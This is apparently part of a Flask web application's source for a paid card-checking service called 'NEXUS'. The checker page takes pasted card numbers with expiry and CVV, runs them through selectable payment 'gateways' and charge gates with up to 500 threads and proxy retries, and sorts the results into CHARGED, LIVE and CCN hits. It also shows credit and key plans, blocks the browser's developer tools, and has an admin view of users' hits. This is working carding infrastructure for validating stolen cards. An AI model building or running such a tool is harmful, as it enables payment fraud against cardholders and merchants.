    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="rgba(255,255,255,.4)" stroke-width="2"><circle cx="11" cy="11" r="8"/><path d="M21 21l-4.35-4.35"/></svg>
    <input id=_sr placeholder="Search by BIN, bank or country..." oninput=_sf() style="margin:0;border:none;background:transparent;padding:2px 0;font-size:13px">
  </div>
</div>
<div class="cd pf-hits-card">
  <div class="pf-hits-hdr">
    <span class="pf-hits-label" style="color:#f59e0b">&#9889; CHARGED</span>
    <span class="pf-hits-count">{len(charged_hits)}</span>
    <button class="btn bs pf-copy-btn" onclick="_cpSection('ahv',this)" style="margin-left:auto">COPY</button>
  </div>
  <div id=ahv style="max-height:260px;overflow-y:auto">{ch_rows}</div>
</div>
<div class="cd pf-hits-card">
  <div class="pf-hits-hdr">
    <span class="pf-hits-label" style="color:#22c55e">&#10003; LIVE</span>
    <span class="pf-hits-count">{len(live_hits)}</span>
    <button class="btn bs pf-copy-btn" onclick="_cpSection('ahv2',this)" style="margin-left:auto">COPY</button>
  </div>
  <div id=ahv2 style="max-height:260px;overflow-y:auto">{cv_rows}</div>
</div>
<div class="cd pf-hits-card">
  <div class="pf-hits-hdr">
    <span class="pf-hits-label" style="color:#60a5fa">&#9670; CCN</span>
    <span class="pf-hits-count">{len(ccn_hits)}</span>
    <button class="btn bs pf-copy-btn" onclick="_cpSection('ahn',this)" style="margin-left:auto">COPY</button>
  </div>
  <div id=ahn style="max-height:260px;overflow-y:auto">{cn_rows}</div>
</div>
</div>
<script>
window._sf=function(){{
var q=document.getElementById('_sr').value.trim().toLowerCase();
var rows=document.querySelectorAll('.r');
for(var i=0;i<rows.length;i++){{
var cc=(rows[i].getAttribute('data-cc')||'').split('|')[0];
var info=(rows[i].getAttribute('data-info')||'').toLowerCase();
rows[i].style.display=(!q||cc.startsWith(q)||info.includes(q))?'':'none';
}}
}};
function _cpSection(id,btn){{
var box=document.getElementById(id);if(!box)return;
var rows=box.querySelectorAll('.r');var lines=[];
rows.forEach(function(r){{var sp=r.querySelector('span:nth-child(2)');if(sp)lines.push(sp.textContent.trim());}});
if(!lines.length)return;
var orig=btn?btn.textContent:'COPY';
var done=function(){{if(btn){{btn.textContent='COPIED!';btn.style.color='#22c55e';setTimeout(function(){{btn.textContent=orig;btn.style.color='';}},1500);}}}};
var txt=lines.join('\\n');
try{{navigator.clipboard.writeText(txt).then(done).catch(function(){{var ta=document.createElement('textarea');ta.value=txt;ta.style.cssText='position:fixed;opacity:0';document.body.appendChild(ta);ta.select();document.execCommand('copy');document.body.removeChild(ta);done();}});}}
catch(e){{var ta=document.createElement('textarea');ta.value=txt;ta.style.cssText='position:fixed;opacity:0';document.body.appendChild(ta);ta.select();document.execCommand('copy');document.body.removeChild(ta);done();}}
}}
</script>''')

@app.route("/checker")
@login_required
def checker():
    d=load_data()
    if session.get("admin"):
        plan="Admin";ia='<a href=/admin>Admin</a>';rem_secs=9999999;rem_cr=9999;adm="true"
    elif session.get("tuid"):
        d=load_data();usr=d.get("users",{}).get(session["tuid"],{})
        cr=usr.get("credits",0);uc=usr.get("used_credits",0);rem_cr=max(cr-uc,0)
        plan=f'\U0001FA99 {rem_cr}';ia="";rem_secs=9999999;adm="false"
    else:
        ki=d["keys"].get(session["key"],{});used=ki.get("used_time",0);dur=ki.get("duration",0)
        rem_secs=max(int(dur-used),0)
        cr=ki.get("credits",0);uc=ki.get("used_credits",0);rem_cr=max(cr-uc,0)
        plan=f'\U0001FA99 {rem_cr}/{cr}';ia="";adm="false"
        ia=""
    tok=session.get("_t")
    if not tok:tok=uuid.uuid4().hex;session["_t"]=tok
    ep=_API_PREFIX
    max_dead_rows=max(100,int(os.getenv("MAX_DEAD_ROWS","5000")))
    default_label=GATEWAYS.get("1",{}).get("label","GATEWAYS")
    gw_buttons=f'''<div class="gwbar">
<div class="gwsel" onclick="this.classList.toggle('open');document.querySelector('.gwlist').classList.toggle('open')">
<span>{default_label}</span><span class="arr">&#9660;</span>
</div>
<div class="gwlist">'''+''.join([f"<button type=button class='gwbtn{' act' if k=='1' else ''}' data-g='{k}' onclick=\"_sg('{k}');document.querySelector('.gwbar').querySelector('.gwsel span').textContent=this.textContent;document.querySelector('.gwsel').classList.remove('open');document.querySelector('.gwlist').classList.remove('open')\">{v['label']}</button>" for k,v in GATEWAYS.items()])+'</div></div>'
    gw_labels=json.dumps({k:v["label"] for k,v in GATEWAYS.items()})
    return base(f'''<div class="wrap">
<div class="hdr"><div class="ck-brand-wrap"><span style="font-size:15px;font-weight:900;letter-spacing:4px;color:#fff;text-shadow:0 0 18px rgba(196,30,30,.55)">⚡ NEXUS</span><span class="ck-divider"></span><span id=_tm style="font-size:13px;color:rgba(255,255,255,.85);font-weight:700;font-family:monospace">{plan}</span></div><div style="display:flex;gap:6px;align-items:center"><a href=/profile style="height:32px;padding:0 12px;border-radius:6px;display:flex;align-items:center;gap:5px;font-size:10px;font-weight:800;color:rgba(255,255,255,.8);text-decoration:none;letter-spacing:.8px;background:rgba(255,255,255,.05);border:1px solid rgba(255,255,255,.1);transition:all .2s"><svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 21v-2a4 4 0 00-4-4H8a4 4 0 00-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>PROFILE</a><button class="btn hbtn" onclick="_rd()" style="font-size:10px!important;padding:0 12px!important;height:32px!important;letter-spacing:.8px!important">REDEEM</button></div></div>
<div class="st">
<div id=_slv class="stat-live"><div class="n" id=_a>0</div><div class="l" id=_al>LIVE</div></div>
<div id=_sccn class="stat-ccn"><div class="n" id=_b>0</div><div class="l">CCN</div></div>
<div id=_schg class="stat-chg"><div class="n" id=_d>0</div><div class="l">CHARGED</div></div>
<div id=_sdec class="stat-dead"><div class="n" id=_c>0</div><div class="l">DECLINED</div></div>
</div>
<div class="cd" style="padding:0;overflow:hidden">
<div class="ck-inp-hdr">
<div class="ck-inp-dots"><div class="ck-inp-dot" style="background:#ef4444"></div><div class="ck-inp-dot" style="background:#f59e0b"></div><div class="ck-inp-dot" style="background:#22c55e"></div></div>
<span class="ck-inp-label">CARD INPUT — cc|mm|yy|cvv</span>
<span style="font-size:9px;color:rgba(255,255,255,.2);font-weight:600;letter-spacing:.5px">nexus</span>
</div>
<div style="padding:14px 16px 16px">
<div class="ta-wrap">
<textarea id=_e placeholder="Paste cards here — one per line&#10;4242424242424242|06|2026|123" rows=6></textarea>
<div class="ta-acts">
<button class="ibtn play" id=_f onclick=_tog()><span id=_fi></span></button>
<button class="btn bg" onclick=_fm() style="border-radius:6px;height:32px;padding:0 12px;font-size:10px;display:flex;align-items:center">CLEAN</button>
</div>
</div>
<div class="gwbar">{gw_buttons}</div>
<div id=_tr class="throw"><span class="thk">Threads</span><input id=_th class=thrange type=range min=1 max=500 step=1 value=120><span id=_thv class="thv">120x</span></div>
<div class="actbar"></div>
<div class="hid" id=_i style="display:flex;align-items:center;gap:10px;margin:12px 0">
<div class="pb" style="flex:1;margin:0"><div class="f" id=_j style="width:0%"></div></div>
<div style="font-size:12px;font-family:monospace;color:rgba(255,255,255,.7);white-space:nowrap;display:flex;gap:12px;font-weight:600"><span id=_spd>0/s</span><span id=_prg>0</span></div>
</div>
</div>
</div>
<div class="cd hid" id=_k_wrap style="padding:0;overflow:hidden"><div class="ck-con-hdr"><div class="ck-con-dot" style="background:#ef4444"></div><div class="ck-con-dot" style="background:#f59e0b"></div><div class="ck-con-dot" style="background:#22c55e;animation:glowPulse 1.4s ease-in-out infinite"></div><span class="ck-con-title">CONSOLE OUTPUT</span></div><div id=_k style="padding:4px 0"></div></div>
<div id=_vp class="hid">
<div class="cd ck-hit-panel" style="border-color:rgba(245,158,11,.3);background:rgba(245,158,11,.03)"><div class="ck-hit-hdr" style="background:rgba(245,158,11,.06);border-color:rgba(245,158,11,.12)"><div class="ck-hit-badge"><span class="ck-hit-glow" style="background:#f59e0b;box-shadow:0 0 8px rgba(245,158,11,.8)"></span><span class="ck-hit-label" style="color:#f59e0b">CHARGED</span></div><button class="btn bs" onclick=_cp('charged') style="padding:4px 12px;font-size:10px;height:26px;letter-spacing:.5px">COPY</button></div><div id=_hc style="max-height:360px;overflow-y:auto;padding:6px 0"></div></div>
<div class="cd ck-hit-panel" style="border-color:rgba(34,197,94,.3);background:rgba(34,197,94,.03)"><div class="ck-hit-hdr" style="background:rgba(34,197,94,.06);border-color:rgba(34,197,94,.12)"><div class="ck-hit-badge"><span class="ck-hit-glow" style="background:#22c55e;box-shadow:0 0 8px rgba(34,197,94,.8)"></span><span class="ck-hit-label" id=_hlv style="color:#22c55e">LIVE</span></div><button class="btn bs" onclick=_cp('live') style="padding:4px 12px;font-size:10px;height:26px;letter-spacing:.5px">COPY</button></div><div id=_hv style="max-height:360px;overflow-y:auto;padding:6px 0"></div></div>
<div class="cd ck-hit-panel" id=_ccnp style="border-color:rgba(96,165,250,.3);background:rgba(96,165,250,.03)"><div class="ck-hit-hdr" style="background:rgba(96,165,250,.06);border-color:rgba(96,165,250,.12)"><div class="ck-hit-badge"><span class="ck-hit-glow" style="background:#60a5fa;box-shadow:0 0 8px rgba(96,165,250,.8)"></span><span class="ck-hit-label" style="color:#60a5fa">CCN</span></div><button class="btn bs" onclick=_cp('ccn') style="padding:4px 12px;font-size:10px;height:26px;letter-spacing:.5px">COPY</button></div><div id=_hn style="max-height:360px;overflow-y:auto;padding:6px 0"></div></div>
</div>
</div>
<div class="modal" id=_mod><div class="mc"><div class="mh"><h3>HIT HISTORY</h3><button class="btn br" onclick=_hm() style="padding:6px 12px;font-size:11px">CLOSE</button></div><div class="mb" id=_mb></div><div class="mbtns"><button class="btn bg" onclick=_hcop() style="padding:8px 16px;font-size:11px">COPY ALL</button><button class="btn br" onclick=_hclr() style="padding:8px 16px;font-size:11px">CLEAR</button></div></div></div>
<script>
!function(){{const _=io();var _0='{tok}',_1=0,_2=0,_10=0,_3=0,_4=0,_5=0,_6=0,_7=[],_8=null,_9=false,_rid=0,_mdr={max_dead_rows},_gw='5',_gmap={gw_labels},_cr={rem_cr},_isAdmin={adm};
console.log('[NEXUS] init',_0.substring(0,8),'gw:',_gw);
_.on('connect',function(){{console.log('[NEXUS] ws connected',_.id);_.emit('auth',{{t:_0}});}});
_.on('connect_error',function(e){{console.log('[NEXUS] ws error',e.message)}});
_.on('disconnect',function(r){{console.log('[NEXUS] ws disconnected',r)}});
_.emit('auth',{{t:_0}});
function _gi(r,k){{return r.i&&r.i[k]!=null&&r.i[k]!==''?r.i[k]:'?'}}
function _es(v){{return String(v==null?'':v).replace(/[&<>"']/g,function(c){{return{{'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}}[c]}})}}
function _nv(v){{v=String(v==null?'':v).trim();if(!v||v==='?'||v==='-')return '';var l=v.toLowerCase();if(l==='unknown'||l==='n/a'||l==='null'||l==='undefined')return '';return v}}
function _meta(r){{var br=_nv(_gi(r,'brand')),bk=_nv(_gi(r,'bank')),tp=_nv(_gi(r,'type')),lv=_nv(_gi(r,'level')),co=_nv(_gi(r,'country'));var mid=bk||(tp&&lv?(tp+' '+lv):(tp||lv));var out=[];if(br)out.push(br);if(mid)out.push(mid);if(co)out.push(co);return out}}
var _chg={{}},_chargeGw={{'1':1,'3':1,'6':1,'7':1,'8':1}};
function _ths(){{
var tr=document.getElementById('_tr');
if(!tr)return;
if(_chg[_gw]){{tr.classList.remove('hid');tr.style.display='flex';}}
else{{tr.classList.add('hid');tr.style.display='none';}}
}}
function _ul(){{
var isCharge=!!_chargeGw[_gw];
var al=document.getElementById('_al');
if(al)al.textContent=isCharge?'LIVE':'CVV';
var hl=document.getElementById('_hlv');
if(hl)hl.textContent=isCharge?'LIVE':'CVV';
var st=document.querySelector('.st');
if(st)st.classList.add('st3');
var ccnStat=document.getElementById('_sccn');
if(ccnStat){{
if(isCharge)ccnStat.classList.add('hid');
else ccnStat.classList.remove('hid');
}}
var ccnPanel=document.getElementById('_ccnp');
if(ccnPanel){{
if(isCharge)ccnPanel.classList.add('hid');
else ccnPanel.classList.remove('hid');
}}
var chgStat=document.getElementById('_schg');
if(chgStat){{
if(isCharge)chgStat.classList.remove('hid');
else chgStat.classList.add('hid');
}}
}}
function _thv(){{
var th=document.getElementById('_th'),tv=document.getElementById('_thv');
if(!th||!tv)return;
var v=parseInt(th.value||'120',10);if(!isFinite(v))v=120;
if(v<1)v=1;if(v>500)v=500;th.value=String(v);tv.textContent=String(v)+'x';
}}
var _npTS={{}};
function _np(id){{
var el=document.getElementById(id);
if(!el)return;
var now=Date.now();
if(_npTS[id]&&now-_npTS[id]<130)return;
_npTS[id]=now;
el.classList.add('npop');
setTimeout(function(){{el.classList.remove('npop');}},130);
}}
var _run=false;
window._sg=function(g,silent){{
if(_run){{_9=true;_run=false;var btn=document.getElementById('_f');btn.classList.remove('stop');btn.classList.add('play');
if(_8){{fetch('{ep}/s',{{method:'POST',headers:{{'Content-Type':'application/json'}},body:JSON.stringify({{j:_8,t:_0}})}});_8=null;}}}}
if(!_gmap[g])g='1';
_gw=g;
var bt=document.querySelectorAll('.gwbtn');
for(var i=0;i<bt.length;i++){{
if(bt[i].getAttribute('data-g')===_gw)bt[i].classList.add('act');
else bt[i].classList.remove('act');
}}
document.getElementById('_a').textContent='0';document.getElementById('_a').classList.remove('ng');
document.getElementById('_b').textContent='0';document.getElementById('_b').classList.remove('ng');
document.getElementById('_d').textContent='0';document.getElementById('_d').classList.remove('ng');document.getElementById('_d').style.color='';
document.getElementById('_c').textContent='0';document.getElementById('_c').style.color='';
document.getElementById('_j').style.width='0%';
document.getElementById('_k').innerHTML='';document.getElementById('_i').classList.add('hid');
document.getElementById('_hc').innerHTML='';document.getElementById('_hv').innerHTML='';document.getElementById('_hn').innerHTML='';
document.getElementById('_vp').classList.add('hid');_7=[];
var vx=document.getElementById('_h');if(vx)vx.remove();
_ths();
_ul();
}};
var _th=document.getElementById('_th');
if(_th){{
_th.addEventListener('input',_thv);
_th.addEventListener('wheel',function(e){{
if(!_chg[_gw])return;
e.preventDefault();
var v=parseInt(_th.value||'120',10);if(!isFinite(v))v=120;
v+=(e.deltaY<0)?1:-1;
if(v<1)v=1;if(v>500)v=500;
_th.value=String(v);_thv();
}},{{passive:false}});
}}
_thv();
window._sg('1',true);
window._tog=function(){{
var btn=document.getElementById('_f');
if(!_run){{
var ta=document.getElementById('_e');
var li=ta.value.trim().split('\\n').filter(function(l){{return l.trim()&&l.includes('|')}});
if(!li.length)return;
var authGates={{'4':1,'5':1}};
var cost=authGates[_gw]?1:5;
if(!_isAdmin&&_cr<=0){{
document.getElementById('_k_wrap').classList.remove('hid');
document.getElementById('_k').innerHTML='<div class="r rd"><span class="t tn">NO CREDITS</span><span>Redeem a code to start checking.</span></div>';
return}}
if(!_isAdmin&&_cr>0&&_cr<cost){{
document.getElementById('_k_wrap').classList.remove('hid');
document.getElementById('_k').innerHTML='<div class="r rd"><span class="t tn">LOW CREDITS</span><span>Need '+cost+' credits. You have '+_cr+'.</span></div>';
return}}
_rid++;var myRid=_rid;
_1=0;_2=0;_10=0;_3=0;_4=0;_7=[];_5=li.length;_6=Date.now();_9=false;_run=true;_8=null;
document.getElementById('_k').innerHTML='';
document.getElementById('_hc').innerHTML='';
document.getElementById('_hv').innerHTML='';
document.getElementById('_hn').innerHTML='';
document.getElementById('_vp').classList.add('hid');
var vx=document.getElementById('_h');if(vx)vx.remove();
document.getElementById('_a').textContent='0';document.getElementById('_a').classList.remove('ng');
document.getElementById('_b').textContent='0';document.getElementById('_b').classList.remove('ng');
document.getElementById('_d').textContent='0';document.getElementById('_d').classList.remove('ng');document.getElementById('_d').style.color='';
document.getElementById('_c').textContent='0';document.getElementById('_c').style.color='';
btn.classList.remove('play');btn.classList.add('stop');
document.getElementById('_j').style.width='0%';
document.getElementById('_spd').textContent='0/s';document.getElementById('_prg').textContent='0';
var threq=0;
fetch('{ep}/c',{{method:'POST',headers:{{'Content-Type':'application/json'}},body:JSON.stringify({{d:ta.value,t:_0,g:_gw,th:threq}})}}).then(function(r){{return r.json()}}).then(function(r){{if(_rid===myRid)_8=r.j}});
}}else{{
_9=true;_run=false;
if(_8)fetch('{ep}/s',{{method:'POST',headers:{{'Content-Type':'application/json'}},body:JSON.stringify({{j:_8,t:_0}})}});
btn.classList.remove('stop');btn.classList.add('play');_8=null;
}}
}};
function _done(){{
if(!_run)return;
_run=false;var btn=document.getElementById('_f');btn.classList.remove('stop');btn.classList.add('play');_8=null;
document.getElementById('_i').classList.add('hid');
}}
window._fm=function(){{
var ta=document.getElementById('_e');
var li=ta.value.trim().split('\\n');var out=[];
for(var idx=0;idx<li.length;idx++){{var l=li[idx].trim();if(!l)continue;l=l.replace(/[\\s\\/:\\-]+/g,'|').replace(/[^0-9|]/g,'');
var p=l.split('|').filter(function(x){{return x}});if(p.length<3)continue;var n=p[0],mm=p[1],yy=p[2],cv=(p.length>=4&&p[3])?p[3]:'000';
if(mm.length===1)mm='0'+mm;if(yy.length===2)yy='20'+yy;if(n.length>=13&&cv.length>=3)out.push(n+'|'+mm+'|'+yy+'|'+cv);}}
ta.value=out.join('\\n');
}};
window._vw=function(){{
var vp=document.getElementById('_vp');
vp.classList.remove('hid');
vp.scrollIntoView({{behavior:'auto',block:'start'}});
}};
window._cp=function(t){{
var cards=_7.filter(function(h){{
if(t==='charged')return h.s==='CHARGED';
if(t==='live'||t==='cvv')return h.s==='CVV'||h.s==='LIVE'||h.s==='3DS';
return h.s==='CCN';
}}).map(function(h){{return h.c}}).join('\\n');
if(!cards)return;
var btn=event?event.target:document.querySelector('[onclick*="_cp"]');
var orig=btn?btn.textContent:'COPY';
var done=function(){{
if(btn){{btn.textContent='COPIED';btn.style.color='#22c55e';setTimeout(function(){{btn.textContent=orig;btn.style.color=''}},1500)}}
}};
try{{
navigator.clipboard.writeText(cards).then(done).catch(function(){{
var ta=document.createElement('textarea');ta.value=cards;ta.style.position='fixed';ta.style.opacity='0';
document.body.appendChild(ta);ta.select();document.execCommand('copy');document.body.removeChild(ta);done();
}});
}}catch(e){{
var ta=document.createElement('textarea');ta.value=cards;ta.style.position='fixed';ta.style.opacity='0';
document.body.appendChild(ta);ta.select();document.execCommand('copy');document.body.removeChild(ta);done();
}}
}};
_.on('r',function(r){{
if(_9||!_run){{console.log('r dropped',_9,_run);return}}
if(!_4){{document.getElementById('_i').classList.remove('hid');document.getElementById('_k_wrap').classList.remove('hid');document.getElementById('_k').innerHTML=''}}
console.log('[NEXUS] result',r.s,r.c);
_4++;
var d=document.getElementById('_k');
var isCharge=!!_chargeGw[_gw];
var viewStatus=r.s;
if(isCharge&&viewStatus==='CCN')viewStatus='LIVE';
var hit=viewStatus==='CVV'||viewStatus==='LIVE'||viewStatus==='CCN'||viewStatus==='CHARGED'||viewStatus==='3DS';
if(viewStatus==='CHARGED'){{_10++;}}
else if(viewStatus==='CVV'||viewStatus==='LIVE'||viewStatus==='3DS'){{_1++;}}
else if(viewStatus==='CCN'){{_2++;}}
else {{_3++;}}
var ea=document.getElementById('_a');ea.textContent=_1;if(_1>0)ea.classList.add('ng');
var eb=document.getElementById('_b');eb.textContent=_2;if(_2>0)eb.classList.add('ng');
var ed=document.getElementById('_d');ed.textContent=_10;if(_10>0)ed.style.color='#f59e0b';
var ec=document.getElementById('_c');ec.textContent=_3;if(_3>0)ec.style.color='#ef4444';
var el=(Date.now()-_6)/1000;
document.getElementById('_spd').textContent=(_4/el).toFixed(1)+'/s';
document.getElementById('_prg').textContent=_4+'/'+_5;
if(_5>0)document.getElementById('_j').style.width=Math.min(100,Math.round(_4/_5*100))+'%';
            var rsn=_nv(r.m)||_nv(r.s)||'NO RESPONSE';
            var md=_meta(r);
            var inf=md.length?(rsn+' | '+md.join(' | ')):rsn;
if(!hit){{
var e=document.createElement('div');e.className='r rd';
var de=_nv(_gi(r,'elapsed'))||'0';
var rtag=(r.s==='ERROR')?'ERROR':'DEAD';
var rcls=(r.s==='ERROR')?'te':'td';
e.innerHTML='<span class="t '+rcls+'">'+_es(rtag)+'</span><span>'+_es(r.c)+'</span><span class="i">'+_es(inf)+' | '+_es(de)+'s</span>';
d.insertBefore(e,d.firstChild);
            while(d.children.length>_mdr)d.removeChild(d.lastChild);
}}
if(hit){{
_7.push({{c:r.c,s:viewStatus}});
try{{var hk='hits_hist';var hl=JSON.parse(localStorage.getItem(hk)||'[]');hl.push({{c:r.c,s:viewStatus,g:_gmap[_gw]||_gw,t:new Date().toLocaleString()}});if(hl.length>500)hl=hl.slice(-500);localStorage.setItem(hk,JSON.stringify(hl));}}catch(e){{}}
if(!document.getElementById('_h')){{
var vb=document.createElement('button');vb.id='_h';vb.className='btn br';vb.style.cssText='margin-left:auto;height:32px;padding:0 12px;display:flex;align-items:center;justify-content:center;border-radius:6px;font-size:10px;letter-spacing:0.5px;flex-shrink:0';vb.textContent='VIEW';vb.onclick=_vw;
document.querySelector('.actbar').appendChild(vb);
}}
var box=document.getElementById('_hv');
var row=document.createElement('div');row.className='hitrow';
var htag='LIVE';
if(viewStatus==='CCN'){{box=document.getElementById('_hn');htag='CCN';}}
else if(viewStatus==='CHARGED'){{box=document.getElementById('_hc');htag='CHARGED';}}
else if(viewStatus==='3DS'){{box=document.getElementById('_hv');htag='3DS';}}
else if(viewStatus==='CVV'){{box=document.getElementById('_hv');htag=isCharge?'LIVE':'CVV';}}
var el2=_nv(_gi(r,'elapsed'))||'0';
var chips=['<span class="htip">'+_es(_nv(r.m)||htag)+'</span>'];
var md2=_meta(r);
for(var ci=0;ci<md2.length;ci++)chips.push('<span class="htip">'+_es(md2[ci])+'</span>');
chips.push('<span class="htip">'+_es(el2)+'s</span>');
row.innerHTML='<div style="display:flex;align-items:center;gap:8px"><span class="htag">'+_es(htag)+'</span><span style="color:#fff;font-weight:700;font-size:13px;font-family:monospace">'+_es(r.c)+'</span></div><div style="display:flex;flex-wrap:wrap;gap:5px;margin-top:6px">'+chips.join('')+'</div>';
box.insertBefore(row,box.firstChild);
}}
}});
_.on('log',function(r){{
if(_9||!_run)return;
document.getElementById('_k_wrap').classList.remove('hid');
var d=document.getElementById('_k');
var msg=_nv(r.m)||'retrying with new proxy';
var e=document.createElement('div');e.className='r rd';
e.innerHTML='<span>'+_es(msg)+'</span>';
d.insertBefore(e,d.firstChild);
while(d.children.length>_mdr)d.removeChild(d.lastChild);
}});
_.on('done',function(){{
console.log('DONE event received');_done()}});
_.on('credits',function(d){{document.getElementById('_tm').textContent='\U0001FA99 '+d.c}});
document.addEventListener('contextmenu',function(e){{e.preventDefault()}});
document.addEventListener('keydown',function(e){{if(e.key==='F12'||(e.ctrlKey&&e.shiftKey&&(e.key==='I'||e.key==='J'))||(e.ctrlKey&&e.key==='u'))e.preventDefault()}});
var _rem={rem_secs},_isAdmin={adm};
setInterval(function(){{
if(_isAdmin||_rem>=9999999)return;
if(_run)_rem--;
var h=Math.floor(_rem/3600),m=Math.floor((_rem%3600)/60),s=_rem%60;
document.getElementById('_tm').textContent=(_rem>0)?h+':'+String(m).padStart(2,'0')+':'+String(s).padStart(2,'0'):'0:00:00';
if(_rem<=0){{
if(_run){{_9=true;_run=false;var btn=document.getElementById('_f');btn.classList.remove('stop');btn.classList.add('play');
if(_8)fetch('{ep}/s',{{method:'POST',headers:{{'Content-Type':'application/json'}},body:JSON.stringify({{j:_8,t:_0}})}});_8=null;}}
if(!document.getElementById('_noplan')){{
var ov=document.createElement('div');ov.id='_noplan';
ov.style.cssText='position:fixed;inset:0;background:rgba(0,0,0,.85);z-index:9999;display:flex;align-items:center;justify-content:center';
ov.innerHTML='<div style="text-align:center;animation:fadeUp .3s ease"><div style="font-size:32px;font-weight:800;color:#fff;margin-bottom:8px">NO PLAN</div><div style="font-size:13px;color:rgba(255,255,255,.4);margin-bottom:20px">Your time has run out</div></div>';
document.body.appendChild(ov);
}}
}}
}},1000);
}}();
window._hs=function(){{
var m=document.getElementById('_mod');m.classList.add('show');
var mb=document.getElementById('_mb');
var hk='hits_hist';
var hl=JSON.parse(localStorage.getItem(hk)||'[]');
if(!hl.length){{mb.innerHTML='<div style="color:rgba(255,255,255,.25);padding:20px;text-align:center">No saved hits yet</div>';return}}
var s='';for(var i=hl.length-1;i>=0;i--){{
var h=hl[i];var sc='#22c55e';if(h.s==='CHARGED')sc='#f59e0b';else if(h.s==='CCN')sc='#60a5fa';
s+='<div class="hitr"><span class="s" style="color:'+sc+'">'+h.s+'</span><span style="font-family:monospace;color:#fff">'+h.c+'</span><span class="g">'+h.g+'</span><span class="t">'+h.t+'</span></div>';
}}
mb.innerHTML=s;
}};
window._hm=function(){{document.getElementById('_mod').classList.remove('show')}};
window._hcop=function(){{
var hk='hits_hist';var hl=JSON.parse(localStorage.getItem(hk)||'[]');
var t='';for(var i=0;i<hl.length;i++)t+=hl[i].c+' | '+hl[i].s+' | '+hl[i].g+' | '+hl[i].t+'\\n';
if(!t)return;
var ta=document.createElement('textarea');ta.value=t;ta.style.position='fixed';ta.style.opacity='0';
document.body.appendChild(ta);ta.select();document.execCommand('copy');document.body.removeChild(ta);
alert('Copied '+hl.length+' hits');
}};
window._hclr=function(){{if(!confirm('Clear all saved hits?'))return;localStorage.removeItem('hits_hist');document.getElementById('_mb').innerHTML='<div style="color:rgba(255,255,255,.25);padding:20px;text-align:center">Cleared</div>'}};
window._rd=function(){{
var m=document.getElementById('_rmod');
if(!m){{
m=document.createElement('div');m.id='_rmod';m.style.cssText='position:fixed;inset:0;background:rgba(0,0,0,.85);z-index:9999;display:flex;align-items:center;justify-content:center';
m.innerHTML='<div style="background:rgba(25,15,15,.95);border:1px solid rgba(255,255,255,.12);border-radius:12px;padding:24px;width:340px;text-align:center;box-shadow:0 0 40px rgba(0,0,0,.6)" onclick="event.stopPropagation()"><p style="font-size:13px;font-weight:800;color:#fff;margin-bottom:16px;letter-spacing:1px">REDEEM CODE</p><input id=_rcode placeholder="XXXX-XXXX-XXXX" maxlength=14 autofocus style="text-align:center;font-size:14px;letter-spacing:2px;width:100%;padding:10px;background:rgba(0,0,0,.35);border:1px solid rgba(255,255,255,.08);color:#fff;border-radius:6px;font-family:monospace"><button id=_rbtn class="btn bg" style="width:100%;margin-top:10px;padding:10px;font-size:12px;letter-spacing:1px" onclick="_rsub()">REDEEM</button><div id=_rmsg style="font-size:10px;margin-top:8px;min-height:16px"></div></div>';
m.onclick=function(){{m.remove()}};
document.body.appendChild(m);
document.getElementById('_rcode').focus();
document.getElementById('_rcode').addEventListener('keydown',function(e){{if(e.key==='Enter')_rsub()}});
}}else{{m.remove()}}
}};
window._rsub=function(){{
var c=document.getElementById('_rcode').value.trim().toUpperCase();
var btn=document.getElementById('_rbtn');var msg=document.getElementById('_rmsg');
if(!c||c.length<8){{msg.innerHTML='<span style="color:#ef4444">Enter a valid code</span>';return}}
btn.textContent='...';btn.disabled=true;
fetch('/redeem',{{method:'POST',headers:{{'Content-Type':'application/x-www-form-urlencoded'}},body:'code='+encodeURIComponent(c)}}).then(r=>r.json()).then(j=>{{
if(j.ok){{msg.innerHTML='<span style="color:#22c55e">+'+j.amount+' credits! Total: '+j.new_total+'</span>';document.getElementById('_tm').textContent='\U0001FA99 '+j.new_total;btn.textContent='DONE';setTimeout(function(){{document.getElementById('_rmod').remove()}},1500)}}
else{{msg.innerHTML='<span style="color:#ef4444">'+j.error+'</span>';btn.textContent='REDEEM';btn.disabled=false}}
}});
}};
</script>''')

@app.route("/admin")
@admin_required
def admin():
    d=load_data();s=d["stats"];now=time.time()
    # Auto-delete expired keys
    expired_keys=[k for k,v in d["keys"].items() if v.get("used") and v.get("activated",0)+v["duration"]<now]
    if expired_keys:
        for k in expired_keys:del d["keys"][k]
        save_data(d)
    # Key rows
    krows="";active=0;unused=0
    for k,v in reversed(list(d["keys"].items())):
        dd2,r=divmod(v["duration"],86400);h,r=divmod(r,3600);m=r//60
        dur=" ".join([f"{int(dd2)}d"if dd2 else"",f"{int(h)}h"if h else"",f"{int(m)}m"if m else""]).strip()
        cr=v.get("credits",0);uc=v.get("used_credits",0);rem_cr=max(cr-uc,0)
        cr_text=f'{rem_cr}/{cr}'
        if v.get("used"):
            used_t=v.get("used_time",0);dur_t=v.get("duration",0);rem_t=max(int(dur_t-used_t),0)
            rh2,rr2=divmod(rem_t,3600);rm2,rs2=divmod(rr2,60)
            tleft=f"{rh2}:{rm2:02d}:{rs2:02d}"
            if rem_t>0 and rem_cr>0:st2=f'<span style="color:#22c55e">Active</span>';active+=1
            elif rem_cr<=0:st2='<span style="color:#f59e0b">No Credits</span>'
            else:st2='<span style="color:#555">Expired</span>'
        else:
            st2='<span style="color:rgba(255,255,255,.4)">Unused</span>';unused+=1
        delbtn=f'<form method=POST action=/admin/delkey style="display:inline"><input type=hidden name=key value="{k}"><button class="btn br" style="padding:4px 8px;font-size:11px">Del</button></form>'
        cpbtn=f'<button class="btn bs" style="padding:4px 8px;font-size:11px" onclick="navigator.clipboard.writeText(\'{k}\');this.textContent=\'Copied\';this.style.color=\'#22c55e\';setTimeout(()=>{{this.textContent=\'Copy\';this.style.color=\'\'}},1500)">Copy</button>'
        krows+=f'<tr><td><code style="user-select:all;cursor:pointer">{k}</code></td><td>{cr_text}</td><td>{dur}</td><td>{st2}</td><td style="display:flex;gap:4px">{cpbtn}{delbtn}</td></tr>'
    hits=d.get("hits",[])
    cvv_hits=[h for h in hits if h["status"] in("CVV","LIVE")]
    ccn_hits=[h for h in hits if h["status"]=="CCN"]
    def hit_row(h):
        ts=time.strftime("%m/%d %H:%M",time.localtime(h.get("time",0)))
        kid=h.get("key","?")
        g=h.get("gate","?")
        uname=""
        if kid in d.get("users",{}):uname="@"+d["users"][kid].get("username",kid[:8])
